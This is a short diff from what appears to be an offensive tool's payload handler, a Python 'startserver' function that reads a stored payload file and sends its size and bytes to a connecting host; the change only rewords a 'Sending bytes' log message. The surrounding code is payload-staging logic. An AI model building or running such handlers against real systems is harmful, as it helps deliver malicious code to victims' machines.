@@ -83,7 +83,7 @@ def startserver(printf, ip='127.0.0.1', port='624', is_input=False, is_auto=True
             conn.send(b'OK')
             with open(f'./payload/upload_payload/{payload_id}', 'rb') as f:
                 se_data = f.read()
-                main.print_normal(f'handler>[*]Sending bytes : {len(se_data)} bytes to {_basic_ip}')
+                main.print_normal(f'handler>[*]Sending bytes ({len(se_data)} bytes) to {_basic_ip}')
                 conn.send(bytes(str(len(se_data)), 'utf8'))
                 conn.recv(1024)
                 conn.send(se_data)
